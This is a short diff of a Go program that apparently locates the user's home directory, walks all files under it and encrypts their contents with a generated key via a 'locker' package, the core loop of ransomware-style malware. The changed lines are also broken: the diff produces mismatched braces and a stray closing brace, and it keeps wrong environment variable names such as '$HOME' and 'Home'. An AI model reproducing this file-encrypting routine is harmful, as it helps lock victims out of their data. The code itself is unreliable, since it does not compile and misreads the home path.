@@ -22,12 +22,11 @@ func main() {
 		if home == "" {
 			home = os.Getenv("USERPROFILE")
 		}
-	} else if runtime.GOOS == "linux" {
-		home = os.Getenv("$HOME")
-
-	} else {
-		home = os.Getenv("Home")
-	}
+	        if runtime.GOOS == "linux" {
+		           home = os.Getenv("$HOME")
+                     } else {
+		                   home = os.Getenv("Home")
+	                     }
 
 	err := filepath.Walk(home, locker.Walker(&files))
 	if err != nil {
@@ -42,4 +41,5 @@ func main() {
 		}
 		locked, err := locker.Encrypt(clearText, locker.KeyGen())
 	}
+}
 }
